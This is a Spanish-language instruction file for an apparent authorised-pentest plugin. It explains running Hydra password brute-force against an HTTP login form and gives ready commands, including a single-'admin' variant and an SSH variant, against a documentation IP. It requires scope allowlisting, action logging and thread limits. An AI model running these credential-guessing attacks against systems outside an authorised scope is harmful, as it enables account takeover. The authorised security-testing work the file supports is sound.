---
inclusion: manual
---

# Ejecución de Hydra contra el formulario/panel de login

## Qué dice el apunte

El apunte (sección 03 "¿Qué protocolo está involucrado?") identifica **HTTP**
como el protocolo de la capa de Aplicación que carga el problema en su caso:
es el que se usó para pedir la página comprometida y cargar el panel de
administración. TCP transporta ese HTTP (capa de Transporte). El apunte no
describe el panel en detalle (no es su objeto: es un ejercicio de lectura de
`tcpdump`, no un tutorial de explotación), por lo que **no da el comando de
Hydra**.

## Regla obligatoria

1. Validar primero que el objetivo está en `scope.yaml#assets` del
   engagement (`allowlistValidation` del `plugin.json`). Sin esto, no se
   ejecuta Hydra.
2. El objetivo por defecto de este Power es un servicio HTTP/HTTPS con
   formulario de login (coherente con el protocolo que señala el apunte).
   Hydra también soporta otros servicios de autenticación de red (SSH, FTP,
   etc.); usarlos solo si el engagement lo pide explícitamente.
3. Declarar en el log de acción (`producesActionLog`) qué variante de
   ataque de la sección de taxonomía (`preparacion-diccionario.md`) se está
   ejecutando, para que el hallazgo sea trazable al patrón del apunte.

## Comandos (añadido)

El apunte no trae comandos de Hydra. Los siguientes son sintaxis estándar de
Hydra añadida para operar este Power; verificar siempre con `hydra -h` en el
entorno real antes de usarlos contra un objetivo autorizado.

```bash
# (añadido) Fuerza bruta de diccionario contra un formulario web de login (módulo http-post-form)
# Sintaxis general:
#   hydra -L <usuarios.txt> -P <contraseñas.txt> <host> http-post-form \
#     "<ruta-login>:<param_user>=^USER^&<param_pass>=^PASS^:<cadena-de-fallo>"
hydra -L users.txt -P passwords.txt 203.0.113.22 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=incorrect"
```

```bash
# (añadido) Modo script-kiddie: un solo usuario conocido (admin), diccionario acotado, baja concurrencia
hydra -l admin -P passwords.txt 203.0.113.22 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=incorrect" -t 4
```

```bash
# (añadido) Ejemplo con otro servicio soportado por Hydra (SSH), solo si el engagement lo pide
hydra -L users.txt -P passwords.txt ssh://203.0.113.22
```

Notas:
- `-L`/`-l` = lista o usuario único; `-P` = lista de contraseñas.
- `-t <n>` controla el número de hilos/tareas en paralelo — ver
  `limites-anti-dos.md` para el valor recomendado por modo.
- La cadena de fallo (`F=...`) o de éxito (`S=...`) depende del texto real
  que devuelve el formulario objetivo; debe inspeccionarse antes de correr
  el ataque (no inventar la cadena, confirmarla contra la respuesta real
  del servicio).
